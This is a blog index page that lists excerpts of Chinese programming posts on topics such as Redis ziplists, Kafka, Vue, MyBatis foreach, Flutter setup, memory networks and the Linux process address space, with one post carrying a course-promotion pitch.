<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f94e906a472f200f221cbfdd8169010/" rel="bookmark">
			多圆相并面积
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多圆相并面积
输入n代表n个圆，输入n个圆的圆心坐标和半径，函数输出多圆相并的公共面积
#include&lt;bits/stdc++.h&gt; using namespace std; typedef long long LL; typedef unsigned long long ULL; typedef vector &lt;int&gt; VI; const int INF = 0x3f3f3f3f; const double eps = 1e-10; const int MOD = 100000007; const int MAXN = 1000010; const double PI = acos(-1.0); #define sqr(x) ((x)*(x)) const int N = 1010; double area[N]; int n; int dcmp(double x){ if (x &lt; -eps) return -1; else return x &gt; eps; } struct cp{ double x, y, r, angle; int d; cp() {} cp(double xx, double yy, double ang = 0, int t = 0){ x = xx; y = yy; angle = ang; d = t; } void get(){ scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f94e906a472f200f221cbfdd8169010/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1744f685b7d369c900914dea6dc9c71a/" rel="bookmark">
			Flutter配置好后，在Android Studio中找不到设备，no devices
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flutter配置好后，在Android Studio中找不到设备，no devices
完成Flutter的Android配置之后，连上设备，运行flutter doctor，发现已经识别了一个可用设备了
[✓] Connected device (1 available)
但是用Android Studio新建Flutter项目之后，却一直显示未找到设备。
找了很多方法，升级插件，升级Android Studio都没有效果，最后在Stack Overflow上找到了解决方案：
就是要配置一下flutter关联的android sdk路径和android studio文件夹，我的设置完sdk路径就可以正常找到device了，问题解决~
粗体部分替换成自己的android sdk路径：
flutter config --android-sdk /path/to/android/sdk
粗体部分替换成自己的android studio文件夹路径（我的不用配置这个就成功了）：
flutter config --android-studio-dir /path/to/android/studio
原文链接：stackoverflow.com/questions/4…
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e04deccfeaafce746601021807d77768/" rel="bookmark">
			redis压缩列表ziplist的连锁扩容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis中的压缩列表在插入数据的时候可能存在连锁扩容的情况。
在压缩列表中，节点需要存放上一个节点的长度，当上一个entry节点长度小于254个字节的时候，将会一个字节的大小来存放entry中的数据，但是当其长度大于等于254的时候，就会需要更大的空间来存放数据。在压缩列表中，会把大于等于254字节长度用5个字节来存储，第一个字节是254，当读到254的时候，将会确认接下来的4个字节大小将是entry的长度数据。当第一个字节为255的时候，就证明压缩列表已经到达末端。
由于表示长度的字节大小不一样，当新节点的插入可能会导致下一个节点原本存放表示上一节点的长度的空间大小不够导致需要扩容这一字段。相应的该字段将会由一个字节扩容到五个字节，四个字节的长度变化，当发生变化的节点原本长度在250到253之间的时候，将会导致下一个节点存储上节点长度的空间发生变化，引起一个连锁扩容的情况，这一情况将会直到一个不需要扩容的节点为止。
while (p[0] != ZIP_END) { zipEntry(p, &amp;cur); rawlen = cur.headersize + cur.len; rawlensize = zipStorePrevEntryLength(NULL,rawlen); /* Abort if there is no next entry. */ if (p[rawlen] == ZIP_END) break; zipEntry(p+rawlen, &amp;next); /* Abort when "prevlen" has not changed. */ if (next.prevrawlen == rawlen) break; if (next.prevrawlensize &lt; rawlensize) { /* The "prevlen" field of "next" needs more bytes to hold * the raw length of "cur". */ offset = p-zl; extra = rawlensize-next.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e04deccfeaafce746601021807d77768/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6fd71480c11a35f50d86d2f69d9a34de/" rel="bookmark">
			关于微信小程序的wx.request执行后sucess和fail的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		做过小程序的朋友们应该都知道，小程序中调用ajax的命令是wx.request，其有两个回调，一个是success，一个是fail，
那么什么情况下会走success，什么情况下会走fail呢？
大多数人可能认为，success就是我成功请求到数据了，也就是请求返回的状态码是2XX，而返回4XX，5XX肯定是出错了，出错了就走fail呗。
那可就错啦，其实只要你的wx.request成功发出了请求，无论返回什么http状态码，都会走success。
说到这很多同学会问这也太不合理了吧，这样success和fail有什么意义？ 答案是这样的设定是非常合理的，当我们遇到断网，域名解析有问题，或者尤其是我们去调用restful api时，可能会在url格式，参数类型上出些问题，这些情况下才会调用到fail。
反之4xx、5xx 等 response的异常状态不会进入fail回调，我们需要在success回调中检查statusCode，根据http状态码的不同去做相应的逻辑判断。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb4ac4496f8e92ec8ac6072a91c84f8f/" rel="bookmark">
			PAT20181209 甲级 7-2&amp;&amp;7-3
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		7-2 Decode Registration Card of PAT
分数16/25
部分答案正确
三种情况分别考虑，用list存储，再用Collections 进行相关排序。
import java.util.ArrayList; import java.util.Collections; import java.util.Comparator; import java.util.Scanner; public class Main { public static class Stu{ String allInfo; String level; String siteNum; String testData; String testeeNumber; int score; } public static class type3{ String num; int cnt; } public static void main(String[] args) { Scanner sc=new Scanner(System.in); int N=sc.nextInt(); int M=sc.nextInt(); Stu[] stu=new Stu[N]; for(int i=0;i&lt;N;i++){ stu[i]=new Stu(); String s=sc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb4ac4496f8e92ec8ac6072a91c84f8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63d2fca146c72ab1f33086007c6c407b/" rel="bookmark">
			【图文详细 】Kafka消息队列——Kafka的优点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 2、Kafka的优点 1、解耦：在项目启动之初来预测将来项目会碰到什么需求，是极其困难的。消息系统在处理过程中间 插入了一个隐含的、基于数据的接口层，两边的处理过程都要实现这一接口。这允许你独立 的扩展或修改两边的处理过程，只要确保它们遵守同样的接口约束。 2、冗余：有些情况下，处理数据的过程会失败。除非数据被持久化，否则将造成丢失。消息队列把数 据进行持久化直到它们已经被完全处理，通过这一方式规避了数据丢失风险。许多消息队列 所采用的”插入-获取-删除”范式中，在把一个消息从队列中删除之前，需要你的处理系统 明确的指出该消息已经被处理完毕，从而确保你的数据被安全的保存直到你使用完毕。 3、扩展性：因为消息队列解耦了你的处理过程，所以增大消息入队和处理的频率是很容易的，只要另外 增加处理过程即可。不需要改变代码、不需要调节参数。扩展就像调大电力按钮一样简单。
4、灵活性&amp;巅峰处理能力：在访问量剧增的情况下，应用仍然需要继续发挥作用，但是这样的突发流量并不常见；如果 为以能处理这类峰值访问为标准来投入资源随时待命无疑是巨大的浪费。使用消息队列能够 使关键组件顶住突发的访问压力，而不会因为突发的超负荷的请求而完全崩溃。
5、可恢复性：系统的一部分组件失效时，不会影响到整个系统。消息队列降低了进程间的耦合度，所以即 使一个处理消息的进程挂掉，加入队列中的消息仍然可以在系统恢复后被处理。 6、顺序保证：在大多使用场景下，数据处理的顺序都很重要。大部分消息队列本来就是排序的，并且能保 证数据会按照特定的顺序来处理。Kafka 保证一个 Partition 内的消息的有序性。
7、缓存：在任何重要的系统中，都会有需要不同的处理时间的元素。例如，加载一张图片比应用过滤 器花费更少的时间。消息队列通过一个缓存层来帮助任务最高效率的执行。写入队列的处理会尽可能的快速。该缓冲有助于控制和优化数据流经过系统的速度。 8、异步通信：很多时候，用户不想也不需要立即处理消息。消息队列提供了异步处理机制，允许用户把一 个消息放入队列，但并不立即处理它。想向队列中放入多少消息就放多少，然后在需要的时 候再去处理它们。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c372ed3190b66f9a47b6fd8609f49844/" rel="bookmark">
			FTPUtil工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package com.travelsky.govprod.hninoutps.ms.dat.util; import com.travelsky.dss.sc.component.slf4j.ILoggerDecorate; import com.travelsky.dss.sc.component.slf4j.LoggerDecoratorFactory; import com.travelsky.govprod.hninoutps.ms.dat.constant.scan.OfLogCodeEnum; import com.travelsky.util.StringUtil; import org.apache.commons.net.ftp.FTPClient; import org.apache.commons.net.ftp.FTPFile; import org.apache.commons.net.ftp.FTPReply; import java.io.*; import java.net.SocketException; import java.text.SimpleDateFormat; import java.util.ArrayList; import java.util.Calendar; import java.util.Date; import java.util.List; /** * FTP工具类 * @author yang */ public class FTPUtil { ILoggerDecorate loggerDecorator = LoggerDecoratorFactory.getLogger(getClass()); //声明常量 public static final int SIZE=1024; /** * 创建FTP连接 * @param ip * @param user * @param password * @return */ public FTPClient obtainFTPClient(String ip, String user, String password) { FTPClient ftpClient = new FTPClient(); try { ftpClient.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c372ed3190b66f9a47b6fd8609f49844/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2275a50041fa3af53579e65d3a609311/" rel="bookmark">
			协方差矩阵的计算及意义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		声明：博文转自https://blog.csdn.net/mr_hhh/article/details/78490576
一、首先看一个比较简洁明了的协方差计算介绍：
1. 协方差定义
X、Y 是两个随机变量，X、Y 的协方差 cov(X, Y) 定义为：
其中，
2. 协方差矩阵定义
矩阵中的数据按行排列与按列排列求出的协方差矩阵是不同的，这里默认数据是按行排列。即每一行是一个observation(or sample)，那么每一列就是一个随机变量。
协方差矩阵：
协方差矩阵的维度等于随机变量的个数，即每一个 observation 的维度。在某些场合前边也会出现 1 / m，而不是 1 / (m - 1).
3. 求解协方差矩阵的步骤
举个例子，矩阵 X 按行排列：
1. 求每个维度的平均值
2. 将 X 的每一列减去平均值
其中：
3. 计算协方差矩阵
--------------------- 作者：Rise_1024 来源：CSDN 原文：https://blog.csdn.net/mr_hhh/article/details/78490576 版权声明：本文为博主原创文章，转载请附上博文链接！
二、再来看一下协方差矩阵的意义：
协方差代表的意义是什么? 在概率论中，两个随机变量 X 与 Y 之间相互关系，大致有下列3种情况：
情况一,如上, 当 X, Y 的联合分布像上图那样时，我们可以看出，大致上有： X 越大 Y 也越大， X 越小 Y 也越小，这种情况，我们称为“正相关”。
情况二, 如上图, 当X, Y 的联合分布像上图那样时，我们可以看出，大致上有：X 越大Y 反而越小，X 越小 Y 反而越大，这种情况，我们称为“负相关”。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2275a50041fa3af53579e65d3a609311/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bea76b21fbcb73c3302ad1d25a1ba1d/" rel="bookmark">
			别让Vue3.0的谣言害了你！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方“前端你别闹”，关注并“星标”
关于Vue 3.0的谣言
智者止于谣言？
北妈在这里给大家澄清一下网络标题党谣言：最近刷屏的 Vue 3.0，其实不会是网络传言的大改版重写，更多的是优化结构和强化性能。
语法和v2.5版本的用法和体系不会改变，不会像angular 一样那么激进，大家可以放心，Vue3.0其实可以总结为以下几点：
更快
更小
更容易维护
更加友好
更容易使用
这个版本甚至可以认为是一个beat版，因为Vue 2.5已经足够好用、轻便、用户群体足够大了，作者不可能重写一套新写法，扳起石头砸自己脚
vue3.0具体代码工作已经在进行中了，预计会在19年上旬会和大家见面包括官方文档甚至新的全家桶用法。
无论3.0的传言可信不可信，但有一个事实是不容忽视的，如今很多web前端居然连vue2.0还不熟悉，甚至不会用，很多国企和外包项目还在jquery，现在vue、react、webpack等已经成了初级前端的基本技能，各位页面仔和落后者们，你应该很慌才对！
关于前端行业的分析～
从2017年到现在，前端开发行业内并不平静。受到资本寒冬导致互联网和创业市场整体遇冷的影响，前端岗位需求有很大程度上的收缩。尤其是最近，连阿里也缩减了社招hc，"凛冬已至"的寒意扑面而来......
一边是互联网红利期过后，市场回归理性，找工作艰难的抱怨声四起；但一边却是前端技术也异常活跃，薪水和地位继续见长。
看似矛盾的两种情景并存，不禁让人疑惑：这两年，前端程序员们究竟过得怎么样？
初级前端——“冰”
初级前端程序员供给泛滥，待遇恶化，发展遇冷。对于初级人员来说，前端市场的确已经进入全面清理期，面临着较大淘汰风险，优胜劣汰带来的是人才质量的整体提高，这就不难理解为什么有很多人抱怨找工作难了。
中高端前端——“火”
形成鲜明对比的是：中高级工程师议价能力向好，越来越吃香。
由于前端技术栈的不断更新，效率提高，同样的前端人数，能完成比以前更多的职责范围。在不少企业，1个优秀的前端工程师就能搞定Web和移动端的开发，甚至负责一部分后端。
还是那句话：在激烈竞争下，经受住考验的永远是那批更优秀的人。中高端人才缺口大，议价能力越来越强，以至于拉高了整个市场的平均薪资水平。
那么，随着企业（尤其是一线互联网公司）招聘要求越来越高，什么样的前端人更受青睐？
1. 基础扎实，对具体主流技术栈要求趋严
2. 更看重技术广度，兼具跨终端和后端开发能力
3. 更加重视综合能力和职业素养
因此，基础薄弱的新人和没有及时构建竞争力的“老程序员”，都要注意积累扎实的基本功、技术广度与深度，以及职业素养，才能抓紧时间“游回岸上”。
与此同时，分享一份福利给需要提升技术水平的前端er：2018年6月份最新录制，价值1599元的Vue视频限时免费供大家学习，内容系统翔实，具体看下图↓↓
添加下面的微信即可领取视频。由于通过之后会逐个发送资源，精力有限，这次开放300个名额，先到先得！
长按添加微信 即可领取Vue视频
PS：希望你领到之后认真学习，不要做收！藏！党！
这套Vue视频由"开课吧"友情提供，大家熟知的IT技术大牛廖雪峰已加盟开课吧，并耗时半年研发了精品付费课程——《Web全栈架构师》，来帮助初级前端工程师实现全方位进阶。课程深度对标百度T6--T7，特别适合有1-3年开发经验的前端程序员们学习，对课程感兴趣也可以加微信了解。
热门阅读：
醒醒吧！送给那些盲目自学的人…
我再送一波教程资料，Vue、大数据、AI都有
我为何一直强调外包公司别去
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54a46c70f6f334cb1b448e4cf072dfd6/" rel="bookmark">
			极简图床中文教程-七牛云CDN永久免费图片外链
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Chinar blog ：www.chinar.xin
极简图床 七牛自定义域名 本文提供全流程，中文翻译。
Chinar 坚持将简单的生活方式，带给世人！
（拥有更好的阅读体验 —— 高分辨率用户请根据需求调整网页缩放比例） Chinar —— 心分享、心创新！
助力利用极简图床实现图片管理、七牛自定义域名、 CDN 加速
为新手节省宝贵的时间，避免采坑！ Chinar 教程效果：
文章目录 1 Intro —— 简介 2 Permanent Preservation —— 七牛永久保存 3 Binding domain —— 绑定域名 4Add CNAME —— 添加别名记录 5 Ping —— 测试配置是否成功 6 Upload Data —— 上传数据 7 Extremely austere —— 极简图床 8 Setting —— 设置绑定 9 Uploading —— 上传至图床 支持 May Be —— 开发者，总有一天要做的事！ 全文高清图片，点击即可放大观看 (很多人竟然不知道) 1 Intro —— 简介 接上一个教程 —— 七牛注册、配置教程 (领取免费额度) 七牛官网注册 尚未注册七牛开发者账号的请根据流程，然后继续阅读本文
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54a46c70f6f334cb1b448e4cf072dfd6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ec4a6127c53d2be186701e771d0adc4/" rel="bookmark">
			数据驱动？什么是数据驱动？？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前几天和一个博士师兄聊天，师兄说：“你毕设做什么题目？”，我把毕设题目给师兄看了，师兄说：“数据驱动啊”。我突然有点懵，我做的不是深度学习吗？怎么变成了数据驱动。可能是因为我知道的太少了吧！
目前个人的理解是：深度学习是机器学习的子集，数据驱动是大数据？可能各有各的说法，但是都是属于人工智能的领域。
让我们通过一个小例子来简单理解一下什么是数据驱动
假设有A和B两家订票网站：
A公司将从网站收集到的数据进行分析，通过数据分析结果认为十一是出行高峰期，所以在十一前后提高价格，并手动在后头调整了十一前后的机票价格和酒店价格。（依靠人为来决定价格）
B公司则通过自动化手段实时收集数据，在线分析相关信息，总结规律，形成数据建模，当用户搜索时自动根据模型对价格进行调整。（可以说B公司进行了“数据采集——数据分析——得到模型”这样的一个过程）
这两个公司，哪家是数据驱动的公司呢？
显而易见，公司B是数据驱动型的公司，而公司A则是一家“以数据为中心来进行决策”的公司。
总的来说，数据驱动就是处理数据，跟数据相关吧！
以上仅为个人理解
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8cbcea73a2b66426ad53ef574dabb972/" rel="bookmark">
			IndexError: tuple index out of range
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		class Vector2d: typecode = 'd'#'d' float 8 typecode 是类属性 在 Vector2d 实例和字节序列之间转换时使用 def __init__(self,x,y): #把 x 和 y 转换成浮点数，尽早捕获错误，以防调用 Vector2d 函数时传入不当参数 self.x = float(x) self.y = float(y) def __iter__(self):#把 Vector2d 实例变成可迭代的对象 return (i for i in (self.x,self.y))#返回一个列表 这里i=[x,y] def __repr__(self): class_name = type(self).__name__ #使用 {!r} 获取各个分量的表示形式，然后插值 return '{}({!r},{!r})'.format(class_name,*self) #错误写法： #(1):return '{}({!r},{!r})'.format((class_name, *self)) #(2)return '{}({!r},{!r})'.format(class_name) python调试报错为：IndexError: tuple index out of range（元组指数超出范围 ）
原因：
1）可能其中一个索引是错误的，无论是内部索引还是外部索引。比如错误写法（1）
2）出现遗漏现象，比如两个{！r}只匹配了其中一个。如错误写法（2）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1d74604f7dabbf617726f8dc50a1d10/" rel="bookmark">
			vue中通过方法返回data中的对象是这个{__ob__: Observer}
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		__ob__: Observer这些数据是vue这个框架对数据设置的监控器，一般都是不可枚举的。
console.log这样的打印函数，被打印的变量会执行自身的toString()，这样，即便内部属性是不可枚举，实际上也能看到。
操作数据的过程中不要删除这些属性：
因为你已经将数据绑定在了vue之中，vue就肯定要为数据添加监控器的，如果你强制删掉了这些监控器，那么这些数据也就失去了监控，那么你使用vue的意义何在……
提交数据时可以通过：
console.log(JSON.stringify(this.obj))，进行获取原始数据对象
数据对象的 __ob__ 属性 http://hcysun.me/vue-design/art/7vue-reactive.html#%E6%95%B0%E6%8D%AE%E5%AF%B9%E8%B1%A1%E7%9A%84-ob-%E5%B1%9E%E6%80%A7
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/203253205408291b458622ffc4677a0b/" rel="bookmark">
			Mybatis foreach  in  方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用场景 在SQL 查询中经常会遇到 select * from table_name where id in (); 但是在Mybatis中由于是防止依赖注入，所有直接用 #{id} 这个是错误的，会造成 in(这里面是个string, )
Mybatis 中foreach() 用法如下： foreach元素的属性主要有 item，index，collection，open，separator，close。
item ------------表示集合中每一个元素进行迭代时的别名，
index------------指 定一个名字，用于表示在迭代过程中，每次迭代到的位置，
open------------表示该语句以什么开始，
separator--------表示在每次进行迭代之间以什么符号作为分隔 符，
close---------------表示以什么结束。
传输参数的不同，主要分为三种：Map list arry ，参数不同，写的方式也不同；
1. 如果传入的是单参数且参数类型是一个List的时候，collection属性值为list
2. 如果传入的是单参数且参数类型是一个array数组的时候，collection的属性值为array
3. 如果传入的参数是多个的时候，我们就需要把它们封装成一个Map了，当然单参数也可；
注意: 在大多数情况下用到Map的还是最多的；
//-----第一种：传入的是list 就是单个参数 只有list 一个对象 &lt;select id="dynamicForeachTest" resultType="Blog"&gt; select * from t_blog where id in &lt;foreach collection="list" index="index" item="item" open="(" separator="," close=")"&gt; #{item} &lt;/foreach&gt; &lt;/select&gt; //-----第二种： 传入的是arry 就是单个参数 只有arry 一个对象 &lt;select id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/203253205408291b458622ffc4677a0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ba2d1a7d3c205166d9bcdf01424a470/" rel="bookmark">
			论文解读：记忆网络（Memory Network）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在了解vqa问题的论文时，发现有很多论文采用了记忆网络的思路，模拟推理过程，这篇文章主要总结关于记忆网络的三篇经典论文，目的是对记忆网络有个认识。分别是：
MEMORY NETWORKS，End-To-End Memory Networks，Ask Me Anything: Dynamic Memory Networks for Natural Language Processing
一，MEMORY NETWORKS 这是Facebook AI在2015年提出来的：MEMORY NETWORKS。论文是第一次提出记忆网络，利用记忆组件保存场景信息，以实现长期记忆的功能。对于很多神经网络模型，RNN，lstm和其变种gru使用了一定的记忆机制，在Memory Networks的作者看来，这些记忆都太小了。这就是这篇文章的目的。
我将从三个部分讲解这篇文章：
记忆网络各个组件的内容记忆网络在nlp的使用损失函数 1，记忆网络： 一个记忆网络（memory networks，简称为MemNN），包括了记忆m，还包括以下4个组件I、G、O、R（lstm的三个门，然后m像cell的list）：
I: (input feature map)：用于将输入转化为网络里内在的向量。（可以利用标准预处理，例如，文本输入的解析，共参考和实体解析。 还可以将输入编码为内部特征表示，例如，从文本转换为稀疏或密集特征向量）G: (generalization)：更新记忆。在作者的具体实现里，只是简单地插入记忆数组里。作者考虑了几种新的情况，虽然没有实现，包括了记忆的忘记，记忆的重新组织。(最简单的G形式是将I（x）存储在存储器中的“slot”中)
O: (output feature map)：从记忆里结合输入，把合适的记忆抽取出来，返回一个向量。每次获得一个向量，代表了一次推理过程。R: (response)：将该向量转化回所需的格式，比如文字或者answer。 2，记忆网络在nlp的使用： 场景：给一个段落和一个问题，给出回答
I: 输入的是一句话，简单地将I转换为一个频率的向量空间模型。
m: 记忆卡槽list。
G:简单地把读到的对话组里的每一句话的向量空间模型，插到记忆的list里，这里默认记忆插槽比对话组句子还多。
O：就是输入一个问题x，将最合适的k个支撑记忆（the supporting memories，在下文的数据集里会举出例子），也就是top-k。做法就是把记忆数组遍历，挑出最大的值。最后，O返回一个长度为k的数组。
R：利用O得到的输出，返回一个词汇w。
打分函数：在O和R中的打分函数：
3，损失函数 采用margin ranking loss，这个与支持向量机的损失函数类似。（即是选出最合适中间结果，和得到最好的预测输出。）
4，理解 记忆网络是一个组件形式的模型，每个模型相互对立又相互影响。每个组件没有固定的模型，可以是传统的模型，也可以是神经网络。论文的缺陷没有思想端到端的训练，端到端的训练将在下面介绍。 二，End-To-End Memory Networks 这篇文章是上面一篇文章的基础之上提出来的端到端的训练方式。并提出重复的去提取有用的信息，实现多次推理的过程。End-To-End Memory Networks
1，单次推理：图a 使用输入集合S={x1,x2,…xi,…,xn}S={x1,x2,…xi,…,xn}表示上下文知识，使用输入向量q表示问题，使用输出向量aˆ表示预测答案。记忆网络模型通过对上下文集合S和问题向量q的数学变换，得到对应于问题的答案。
Input memory representation：把 词进行embedding，变成向量放入m中。q：对问题q进行同样的embedding计算u和记忆m的匹配程度。
输出o：记忆m的加权和
-用o，以及问题u预测答案：
2，多次推理：图b 每次的更新：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ba2d1a7d3c205166d9bcdf01424a470/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e05f12ca869342ab78edf3c332575b3c/" rel="bookmark">
			C&#43;&#43; 实现大整数类运算符重载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		018:别叫，这个大整数已经很简化了! 查看提交统计提问 总时间限制: 1000ms
内存限制: 65536kB
// 在此处补充你的代码 描述
程序填空，输出指定结果
#include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;cstdio&gt; using namespace std; const int MAX = 110; class CHugeInt { }; int main() { char s[210]; int n; while (cin &gt;&gt; s &gt;&gt; n) { CHugeInt a(s); CHugeInt b(n); cout &lt;&lt; a + b &lt;&lt; endl; cout &lt;&lt; n + a &lt;&lt; endl; cout &lt;&lt; a + n &lt;&lt; endl; b += n; cout &lt;&lt; ++ b &lt;&lt; endl; cout &lt;&lt; b++ &lt;&lt; endl; cout &lt;&lt; b &lt;&lt; endl; } return 0; } 输入
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e05f12ca869342ab78edf3c332575b3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26dde8831889c53b91be361189a39d45/" rel="bookmark">
			深入理解 Linux 内核---进程地址空间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		讲述：
进程是怎样看待动态内存的。
进程空间的基本组成。
缺页异常处理程序在推迟给进程分配页框中所起的作用。
内核怎样创建和删除进程的整个地址空间。
与进程的地址空间管理有关的 API 和系统调用。
进程的地址空间 进程的地址空间由允许进程使用的全部线性地址组成。
每个进程看到的线性地址集合是不同的。
内核可通过增加或删除某些线性地址区间来动态地修改进程的地址空间。
内核通过线性区来表示线性地址区间，由起始线性地址、长度和一些访问权限描述。
为效率起见，起始地址和长度都必须是 4096 的倍数，这样线性区的数据就可以完全填满分配给它的页框。
下面是获得新线性区的一些典型情况：
用户在控制台输入一条命令时，shell 进程创建一个新进程区执行该命令，一组线性区会分配给新进程。正在运行的进程可能会装入一个完全不同的程序，进程标识符保持不变，但该程序使用的线性区会替换。正在运行的进程可能对一个文件（或它的一部分）执行”内存映射“，内核会给该进程分配一个新的线性区来映射该文件。进程可能持续向它的用户态堆栈增加数据，直到映射该堆栈的线性区用完，这时，内核也许会扩展该线性区的大小。进程可能创建一个 IPC 共享线性区来与其他何作进程共享数据，这时，内核会给该进程分配一个新的线性区。进程可能通过调用类似 malloc() 的函数扩展自己的动态区（堆），这时，内核可能决定扩展分配给该堆的线性区。 确定一个进程当前所拥有的线性区（即进程的地址空间）是内核的基本任务，因为可让缺页异常处理程序有效地区分两种不同的无效线性地址：
由编程错误引发的无效线性地址。由缺页引发的无效线性地址：即使该线性地址属于进程的地址空间，但对应于该地址的页框仍有待分配。 内存描述符 内存描述符包含与进程地址空间有关的全部信息，该结构类型为 mm_struct，进程描述符的 mm 字段指向它。
所有的内存描述符存放在一个双向链表。
每个描述符的 mmlist 字段存放链表相邻元素的地址。
链表的第一个元素是 init_mm 的 mmlist 字段，init_mm 是初始化阶段进程 0 所使用的内存描述符。
mmlist_lock 自旋锁保护多处理器系统堆链表的同时访问。
mm_users 字段存放共享 mm_struct 数据结构的轻量级进程的个数。
mm_count 字段是内存描述符的主使用计数器，值为 0 时，解除该内存描述符。
mm_users 次使用计数器中的所有用户在 mm_count 中值作为一个单位。
如果内核向确保内存描述符在一个长操作的中间不被释放，应该增加 mm_users 字段而不是 mm_count 字段的值，最终结果是相同的。
mm_alloc() 获得一个新的内存描述符。
由于内存描述符被保存在 slab 分配器高速缓存中，因此，mm_alloc() 调用 kmem_cache_alloc() 初始化新的内存描述符，并将 mm_count 和 mm_users 都设为 1。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26dde8831889c53b91be361189a39d45/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c4feddbd52fd80fcdf309421145642f/" rel="bookmark">
			python实现蒙特卡洛Monte Carlo算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
